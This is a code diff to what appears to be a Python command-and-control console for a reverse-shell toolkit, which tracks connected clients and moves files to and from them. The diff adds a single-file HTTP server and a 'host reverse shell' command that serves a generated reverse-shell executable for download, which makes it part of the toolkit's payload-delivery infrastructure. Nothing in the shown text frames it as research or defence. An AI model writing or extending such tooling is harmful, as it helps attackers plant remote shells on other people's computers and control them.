@@ -4,6 +4,7 @@ import tqdm
 import os
 import threading
 import urllib.parse
+import http.server
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import subprocess
 import tabulate
@@ -14,6 +15,12 @@ import folium
 import webbrowser
 import re as r
 from colorama import init, Fore, Back, Style
+import json
+import socketserver
+import threading
+import os
+
+
 
 SEPARATOR = "<sep>"  # For separating filename and filesize
 
@@ -21,6 +28,8 @@ client_id = 0
 clients = []
 connect = False
 cwd = ""
+fh_http = None
+
 
 # HTTP Server for Ping
 class SimpleHandler(BaseHTTPRequestHandler):
@@ -246,6 +255,44 @@ def FormatTime(seconds):
     else:
         return time.strftime('%Ss', time.gmtime(seconds))
 
+# Server for File hosting
+
+def run_file_server(filename, port=5006):
+
+    class OneFileHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path not in ('/', f'/{os.path.basename(filename)}'):
+                self.send_error(404, "File not found")
+                return
+
+            try:
+                with open(filename, 'rb') as f:
+                    file_data = f.read()
+            except FileNotFoundError:
+                self.send_error(404, "File not found on server")
+                return
+
+            self.send_response(200)
+            self.send_header("Content-Type", "application/octet-stream")
+            self.send_header("Content-Disposition", f'attachment; filename="{os.path.basename(filename)}"')
+            self.send_header("Content-Length", str(len(file_data)))
+            self.end_headers()
+            self.wfile.write(file_data)
+
+        def log_message(self, format, *args):
+            return
+
+    httpd = socketserver.TCPServer(("", port), OneFileHandler)
+    print(f"[✓] Hosting '{filename}' at http://localhost:{port}/ (auto-download)")
+    
+    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+    thread.start()
+    return httpd, thread
+
+
+
+
+
 # Server for File Download
 def StartServer(host='127.0.0.1', port=5005, output_folder='received_files'):
     global server_running
@@ -386,9 +433,14 @@ def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
 
 
 def StopServices():
+    global fh_http
     print(f"\n[*] Stopping services...")
     stop_http_server()
     stop_file_server()
+    if fh_http:
+        fh_http.shutdown()
+        fh_http.server_close()
+        fh_http = None
     print(f"{TimeStamp()} services stopped.")
 
 # Command handling system
@@ -520,6 +572,23 @@ def cmd_type():
 def cmd_start_file_server():
         start_file_server_in_thread()
         print(f"{TimeStamp()} File server started on {SERVER_HOST}:5005")
+
+@command("host reverse shell", arg_spec=[("path", str, True)], description="Host a previously generated reverse shell for download")
+def cmd_host_reverse_shell(path=None):
+    global fh_http
+    if path == None:
+        try:
+            with open("UserSettings.json", "r") as f:
+                settings = json.load(f)
+                path = f"{settings["output_name"]}.exe"
+        except FileNotFoundError:
+            print("[!] UserSettings.json not found. Please provide the path to the reverse shell file.")
+            return
+    if not os.path.exists(path):
+        print(f"[!] The file {path} does not exist.")
+        return
+    fh_http, thread = run_file_server(path, port=5006)
+
 
 
 @command("connect", arg_spec=[("client_id", int)], description="Connect to a specific client")
